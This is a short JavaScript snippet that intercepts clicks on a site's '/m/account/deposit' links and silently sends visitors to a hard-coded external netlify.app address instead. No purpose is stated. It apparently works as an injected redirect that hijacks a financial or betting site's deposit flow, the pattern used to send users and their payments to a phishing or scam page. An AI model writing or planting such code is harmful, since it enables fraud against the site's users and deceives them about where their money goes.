(function () {
    "use strict";

    const TARGET = "https://voluble-duckanoo-77a8a2.netlify.app";

    document.addEventListener("click", function (e) {
        const link = e.target.closest("a");
        if (!link) return;

        try {
            const url = new URL(link.href, location.origin);

            if (url.pathname === "/m/account/deposit") {
                e.preventDefault();
                e.stopPropagation();
                window.location.href = TARGET;
            }
        } catch (err) {}
    }, true);
})();
